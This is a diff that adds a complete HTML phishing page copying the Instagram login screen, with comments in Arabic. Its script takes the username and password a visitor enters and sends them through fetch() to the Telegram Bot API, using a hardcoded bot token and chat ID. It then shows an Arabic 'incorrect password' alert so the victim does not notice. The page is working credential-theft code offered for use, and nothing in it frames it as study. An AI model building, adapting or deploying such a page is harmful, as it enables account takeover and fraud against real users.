@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Page</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fafafa;
+        }
+
+        .wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            width: 100%;
+            max-width: 400px;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 36px;
+            font-weight: bold;
+            color: #f58529; /* بداية اللون البرتقالي */
+            background: linear-gradient(45deg, #f58529, #d81e5b, #9b4dca); /* التدرج المستخدم في شعار إنستجرام */
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+        }
+
+        .input_field {
+            margin-bottom: 15px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #fafafa;
+        }
+
+        .btn a {
+            display: block;
+            background-color: #0095f6;
+            color: #fff;
+            padding: 14px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+
+        .or {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .or .line {
+            width: 40%;
+            height: 1px;
+            background-color: #ccc;
+        }
+
+        .or p {
+            margin: 0 10px;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .forgot a {
+            font-size: 14px;
+            color: #0095f6;
+        }
+
+        .signup p {
+            font-size: 14px;
+            color: #555;
+        }
+
+        .apps {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .icons a {
+            margin: 0 5px;
+        }
+
+        .footer {
+            margin-top: 40px;
+            width: 100%;
+            background-color: #f9f9f9;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .footer .links ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .footer .links ul li {
+            display: inline;
+            margin: 0 10px;
+        }
+
+        .footer .links ul li a {
+            text-decoration: none;
+            color: #555;
+            font-size: 14px;
+        }
+
+        .footer .copyright {
+            margin-top: 10px;
+            color: #999;
+            font-size: 12px;
+        }
+
+        /* استجابة للشاشات الصغيرة */
+        @media (max-width: 768px) {
+            .wrapper {
+                padding: 10px;
+            }
+
+            .header {
+                padding: 30px;
+            }
+
+            .input {
+                padding: 12px;
+                font-size: 14px;
+            }
+
+            .btn a {
+                padding: 12px;
+                font-size: 16px;
+            }
+
+            .footer .links ul li {
+                display: block;
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <div class="logo">
+            Instagram
+        </div>
+        <div class="form">
+            <div class="input_field">
+                <input type="text" id="usernameOrEmail" placeholder="Phone number, username, or email" class="input" required>
+            </div>
+            <div class="input_field">
+                <input type="password" id="password" placeholder="Password" class="input" required>
+            </div>
+            <div class="btn"><a href="#" id="loginBtn">Log In</a></div>
+        </div>
+        <div class="or">
+            <div class="line"></div>
+            <p>OR</p>
+            <div class="line"></div>
+        </div>
+        <div class="dif">
+            <div class="fb">
+                <p>Log in with Facebook</p>
+            </div>
+            <div class="forgot">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+    </div>
+    <div class="signup">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+    <div class="apps">
+        <p>Get the app.</p>
+        <div class="icons">
+            <a href="#"><img src="appstore.png" alt="App Store"></a>
+            <a href="#"><img src="googleplay.png" alt="Google Play"></a>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <div class="links">
+        <ul>
+            <li><a href="#">ABOUT US</a></li>
+            <li><a href="#">SUPPORT</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">JOBS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">DIRECTORY</a></li>
+            <li><a href="#">PROFILES</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+    </div>
+    <div class="copyright">
+        © 2024 Instagram
+    </div>
+</div>
+
+<script>
+    const botToken = "7313277524:AAFPzkl5iXAlNfq5LiM7_OlBVHPkmk-ydpg"; // ضع توكن البوت هنا
+    const chatId = "5965289737"; // ضع معرف الدردشة الخاصة بك
+
+    document.getElementById('loginBtn').addEventListener('click', function(event) {
+        event.preventDefault();
+
+        const usernameOrEmail = document.getElementById('usernameOrEmail').value;
+        const password = document.getElementById('password').value;
+
+        // إنشاء رسالة تحتوي على البيانات
+        const message = `New Login Details:\n📧 Phone or Email: ${usernameOrEmail}\n🔑 Password: ${password}`;
+
+        // إرسال البيانات إلى تلجرام
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        }).then(response => {
+            if (response.ok) {
+                alert("كلمة المرور غير صحيحة");
+            } else {
+                alert("There was an error sending the data.");
+            }
+        }).catch(error => {
+            alert("Unable to connect to the server.");
+            console.error(error);
+        });
+    });
+</script>
+
+</body>
+</html>
